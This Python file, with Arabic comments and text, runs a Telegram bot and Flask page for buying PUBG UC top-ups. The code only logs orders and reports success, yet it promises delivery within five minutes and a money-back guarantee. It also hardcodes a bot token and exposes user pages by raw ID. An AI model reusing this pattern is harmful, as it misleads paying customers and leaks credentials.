import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from flask import Flask, request, render_template_string
import threading
import secrets
from datetime import datetime

# التوكن الخاص بك
BOT_TOKEN = "7955384959:AAEIU_kzt3hyEmsK9QHoinkSlrld_vWkDB8"
# على Render سيكون تلقائياً
BASE_URL = os.getenv('RENDER_EXTERNAL_URL', 'https://your-app-name.onrender.com')

# تخزين بيانات المستخدمين
user_sessions = {}

# إعداد Flask
app = Flask(__name__)

# صفحة الويب HTML - جميلة ومتجاوبة
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن شدات ببجي - {{user_name}}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
            padding: 30px 20px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
        }
        
        .user-info {
            background: #f8f9fa;
            padding: 15px;
            text-align: center;
            border-bottom: 1px solid #eee;
        }
        
        .user-info .name {
            font-weight: bold;
            color: #2d3436;
            font-size: 18px;
        }
        
        .user-info .id {
            color: #636e72;
            font-size: 14px;
            margin-top: 5px;
        }
        
        .form-section {
            padding: 30px 25px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2d3436;
            font-size: 16px;
        }
        
        .form-group input, .form-group select {
            width: 100%;
            padding: 15px;
            border: 2px solid #e9ecef;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            background: white;
        }
        
        .form-group input:focus, .form-group select:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .packages {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 10px;
        }
        
        .package {
            border: 2px solid #e9ecef;
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            background: white;
        }
        
        .package:hover {
            border-color: #667eea;
            transform: translateY(-2px);
        }
        
        .package.selected {
            border-color: #667eea;
            background: #f8f9ff;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
        }
        
        .package .amount {
            font-size: 16px;
            font-weight: bold;
            color: #2d3436;
        }
        
        .package .price {
            color: #00b894;
            font-weight: 600;
            margin-top: 5px;
            font-size: 14px;
        }
        
        .btn {
            background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 184, 148, 0.3);
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #636e72;
            font-size: 14px;
            border-top: 1px solid #eee;
            background: #f8f9fa;
        }
        
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            margin-top: 20px;
            display: none;
            border: 1px solid #c3e6cb;
        }
        
        .instructions {
            background: #d1ecf1;
            color: #0c5460;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            border: 1px solid #bee5eb;
        }
        
        .instructions h3 {
            margin-bottom: 10px;
            color: #0c5460;
        }
        
        @media (max-width: 480px) {
            .container {
                margin: 10px;
            }
            
            .packages {
                grid-template-columns: 1fr;
            }
            
            .form-section {
                padding: 20px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎮 شحن شدات ببجي</h1>
            <p>شحن آمن وسريع ⚡</p>
        </div>
        
        <div class="user-info">
            <div class="name">👤 {{user_name}}</div>
            <div class="id">🆔 {{user_id}}</div>
        </div>
        
        <div class="form-section">
            <div class="instructions">
                <h3>📋 طريقة الشحن:</h3>
                <p>1. أدخل رقم اللاعب</p>
                <p>2. اختر الباقة المناسبة</p>
                <p>3. اتمام الدفع</p>
                <p>4. ستصل الشدات خلال 5 دقائق ⚡</p>
            </div>
            
            <form id="chargeForm">
                <div class="form-group">
                    <label for="playerId">🎯 رقم اللاعب (Player ID)</label>
                    <input type="text" id="playerId" placeholder="أدخل رقم اللاعب الخاص بك" required>
                </div>
                
                <div class="form-group">
                    <label>📦 اختر الباقة</label>
                    <div class="packages">
                        <div class="package" data-amount="60" data-price="5">
                            <div class="amount">60 شدّة</div>
                            <div class="price">5$</div>
                        </div>
                        <div class="package" data-amount="325" data-price="25">
                            <div class="amount">325 شدّة</div>
                            <div class="price">25$</div>
                        </div>
                        <div class="package" data-amount="660" data-price="50">
                            <div class="amount">660 شدّة</div>
                            <div class="price">50$</div>
                        </div>
                        <div class="package" data-amount="1800" data-price="100">
                            <div class="amount">1800 شدّة</div>
                            <div class="price">100$</div>
                        </div>
                    </div>
                    <input type="hidden" id="selectedPackage" name="package" required>
                </div>
                
                <div class="form-group">
                    <label for="payment">💳 طريقة الدفع</label>
                    <select id="payment" required>
                        <option value="">اختر طريقة الدفع</option>
                        <option value="credit">💳 بطاقة ائتمان</option>
                        <option value="paypal">📱 PayPal</option>
                        <option value="stc">📞 STC Pay</option>
                        <option value="mada">💳 مدى</option>
                        <option value="apple">🍎 Apple Pay</option>
                    </select>
                </div>
                
                <button type="submit" class="btn">⚡ شحن الآن</button>
                
                <div class="success-message" id="successMessage">
                    <h3>✅ تم استلام طلبك بنجاح!</h3>
                    <p>سيتم شحن الشدات خلال 5 دقائق</p>
                    <p>📞 للاستفسار: @your_support</p>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <p>⏰ خدمة عملاء 24/7</p>
            <p>🛡️ ضمان استعادة الأموال خلال 24 ساعة</p>
            <p>⚡ شحن فوري بعد التأكيد</p>
        </div>
    </div>

    <script>
        // اختيار الباقة
        document.querySelectorAll('.package').forEach(pkg => {
            pkg.addEventListener('click', function() {
                document.querySelectorAll('.package').forEach(p => p.classList.remove('selected'));
                this.classList.add('selected');
                document.getElementById('selectedPackage').value = this.getAttribute('data-amount');
            });
        });
        
        // إرسال النموذج
        document.getElementById('chargeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const playerId = document.getElementById('playerId').value;
            const package = document.getElementById('selectedPackage').value;
            const payment = document.getElementById('payment').value;
            
            if (!playerId || !package || !payment) {
                alert('⚠️ يرجى ملء جميع الحقول المطلوبة');
                return;
            }
            
            // إظهار رسالة النجاح
            document.getElementById('successMessage').style.display = 'block';
            
            // إرسال البيانات إلى الخادم
            fetch('/process-payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    playerId: playerId,
                    package: package,
                    payment: payment,
                    userId: '{{user_id}}',
                    userName: '{{user_name}}',
                    timestamp: new Date().toISOString()
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم إرسال الطلب:', data);
            })
            .catch(error => {
                console.error('خطأ:', error);
            });
            
            // إعادة تعيين النموذج بعد 5 ثوان
            setTimeout(() => {
                this.reset();
                document.querySelectorAll('.package').forEach(p => p.classList.remove('selected'));
                document.getElementById('successMessage').style.display = 'none';
            }, 5000);
        });
        
        // تحسين تجربة المستخدم على الهواتف
        document.addEventListener('touchstart', function() {}, { passive: true });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>بوت شحن شدات ببجي</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                text-align: center; 
                padding: 50px; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container {
                background: white;
                color: #333;
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                max-width: 500px;
                margin: 0 auto;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎮 بوت شحن شدات ببجي</h1>
            <p>🟢 الخدمة تعمل بنجاح</p>
            <p>استخدم البوت في التليجرام للوصول إلى صفحتك الشخصية</p>
            <p>👉 <a href="https://t.me/your_bot">اضغط هنا لفتح البوت</a></p>
        </div>
    </body>
    </html>
    """

@app.route('/charge/<user_id>')
def charge_page(user_id):
    """صفحة الشحن الخاصة بكل مستخدم"""
    if user_id in user_sessions:
        user_data = user_sessions[user_id]
        return render_template_string(HTML_TEMPLATE, 
                                   user_name=user_data['name'],
                                   user_id=user_id)
    else:
        return """
        <!DOCTYPE html>
        <html dir="rtl">
        <head><meta charset="UTF-8"><title>رابط غير صالح</title></head>
        <body style="text-align: center; padding: 50px; font-family: Arial;">
            <h1>❌ رابط غير صالح</h1>
            <p>هذا الرابط غير صالح أو منتهي الصلاحية</p>
            <p>👉 <a href="https://t.me/your_bot">ارجع إلى البوت وأنشئ رابط جديد</a></p>
        </body>
        </html>
        """

@app.route('/process-payment', methods=['POST'])
def process_payment():
    """معالجة الدفع"""
    try:
        data = request.json
        user_id = data.get('userId')
        player_id = data.get('playerId')
        package = data.get('package')
        payment_method = data.get('payment')
        
        # تسجيل الطلب (يمكنك حفظه في قاعدة بيانات لاحقاً)
        print("🎯 طلب شحن جديد:")
        print(f"👤 المستخدم: {user_id}")
        print(f"🎮 رقم اللاعب: {player_id}")
        print(f"📦 الباقة: {package} شدّة")
        print(f"💳 طريقة الدفع: {payment_method}")
        print(f"⏰ الوقت: {datetime.now()}")
        print("=" * 50)
        
        return {
            "status": "success", 
            "message": "تم استلام طلبك بنجاح وسيتم الشحن خلال 5 دقائق",
            "order_id": secrets.token_hex(8).upper()
        }
    except Exception as e:
        print(f"❌ خطأ في معالجة الدفع: {e}")
        return {"status": "error", "message": "حدث خطأ أثناء معالجة الطلب"}

def run_web_server():
    """تشغيل خادم الويب"""
    port = int(os.environ.get('PORT', 10000))
    print(f"🌐 بدء خادم الويب على المنفذ {port}")
    app.run(host='0.0.0.0', port=port, debug=False)

# وظائف البوت التليجرام
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب وإنشاء رابط المستخدم"""
    user = update.effective_user
    user_id = str(user.id)
    
    # إنشاء رابط فريد للمستخدم
    session_token = secrets.token_urlsafe(16)
    user_sessions[user_id] = {
        'name': user.first_name,
        'token': session_token,
        'created_at': datetime.now()
    }
    
    # إنشاء الرابط الخاص بالمستخدم
    user_link = f"{BASE_URL}/charge/{user_id}"
    
    keyboard = [
        [InlineKeyboardButton("🌟 شحن شدات ببجي", callback_data="charge")],
        [InlineKeyboardButton("🌐 صفحتي الشخصية", url=user_link)],
        [InlineKeyboardButton("📞 الدعم الفني", url="https://t.me/your_support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_html(
        f"مرحباً {user.mention_html()}! 👋\n\n"
        f"🎮 <b>بوت شحن شدات ببجي</b>\n\n"
        f"🌐 <b>رابطك الشخصي:</b>\n<code>{user_link}</code>\n\n"
        f"✅ <b>مميزات الخدمة:</b>\n"
        f"• شحن فوري خلال 5 دقائق ⚡\n"
        f"• أسعار تنافسية 💰\n"
        f"• دعم فني 24/7 📞\n"
        f"• ضمان استعادة الأموال 🛡️\n\n"
        f"📱 <b>طريقة الاستخدام:</b>\n"
        f"1. اضغط على 'صفحتي الشخصية'\n"
        f"2. املأ البيانات المطلوبة\n"
        f"3. اختر الباقة والدفع\n"
        f"4. تأكيد الطلب\n\n"
        f"⚡ <b>الشدات تصل تلقائياً خلال 5 دقائق!</b>",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الضغط على الأزرار"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    user_id = str(user.id)
    
    # تأكد من وجود جلسة للمستخدم
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'name': user.first_name,
            'token': secrets.token_urlsafe(16),
            'created_at': datetime.now()
        }
    
    user_link = f"{BASE_URL}/charge/{user_id}"
    
    if query.data == "charge":
        keyboard = [
            [InlineKeyboardButton("🌐 فتح صفحتي", url=user_link)],
            [InlineKeyboardButton("🔄 إنشاء رابط جديد", callback_data="new_link")],
            [InlineKeyboardButton("📞 الدعم الفني", url="https://t.me/your_support")],
            [InlineKeyboardButton("🏠 الرجوع للرئيسية", callback_data="home")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🎮 <b>شحن شدات ببجي</b>\n\n"
            f"🌐 <b>رابطك الشخصي:</b>\n<code>{user_link}</code>\n\n"
            f"📋 <b>طريقة الاستخدام:</b>\n"
            f"1. اضغط على 'فتح صفحتي'\n"
            f"2. املأ رقم اللاعب\n"
            f"3. اختر الباقة والدفع\n"
            f"4. تأكيد الطلب\n\n"
            f"⚡ <b>مميزاتنا:</b>\n"
            f"• شحن فوري خلال 5 دقائق\n"
            f"• دعم فني 24/7\n"
            f"• أسعار منافسة\n"
            f"• ضمان استعادة الأموال",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    
    elif query.data == "new_link":
        # إنشاء رابط جديد
        session_token = secrets.token_urlsafe(16)
        user_sessions[user_id] = {
            'name': user.first_name,
            'token': session_token,
            'created_at': datetime.now()
        }
        
        new_link = f"{BASE_URL}/charge/{user_id}"
        keyboard = [
            [InlineKeyboardButton("🌐 فتح الرابط الجديد", url=new_link)],
            [InlineKeyboardButton("🔄 العودة", callback_data="charge")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🔄 <b>تم إنشاء رابط جديد</b>\n\n"
            f"🌐 <b>رابطك الجديد:</b>\n<code>{new_link}</code>\n\n"
            f"✅ يمكنك مشاركة هذا الرابط أو حفظه للاستخدام المستقبلي",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    
    elif query.data == "home":
        keyboard = [
            [InlineKeyboardButton("🌟 شحن شدات ببجي", callback_data="charge")],
            [InlineKeyboardButton("🌐 صفحتي الشخصية", url=user_link)],
            [InlineKeyboardButton("📞 الدعم الفني", url="https://t.me/your_support")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"أهلاً بك مجدداً {user.first_name}! 👋\n\n"
            f"اختر الخدمة التي تريدها:",
            reply_markup=reply_markup
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المساعدة"""
    await update.message.reply_text(
        "📞 <b>الدعم الفني</b>\n\n"
        "للشحن: اضغط /start ثم اختر 'شحن شدات ببجي'\n"
        "للدعم: @your_support\n\n"
        "⏰ خدمة عملاء 24/7",
        parse_mode='HTML'
    )

def main():
    """الدالة الرئيسية"""
    # تشغيل خادم الويب في thread منفصل
    web_thread = threading.Thread(target=run_web_server)
    web_thread.daemon = True
    web_thread.start()
    
    # تشغيل البوت التليجرام
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CallbackQueryHandler(button_handler))
        
        print("=" * 50)
        print("🚀 بوت شحن شدات ببجي يعمل الآن!")
        print(f"🌐 رابط الخادم: {BASE_URL}")
        print("🤖 البوت جاهز لاستقبال الطلبات")
        print("=" * 50)
        
        application.run_polling()
        
    except Exception as e:
        print(f"❌ خطأ في تشغيل البوت: {e}")

if __name__ == "__main__":
    main()
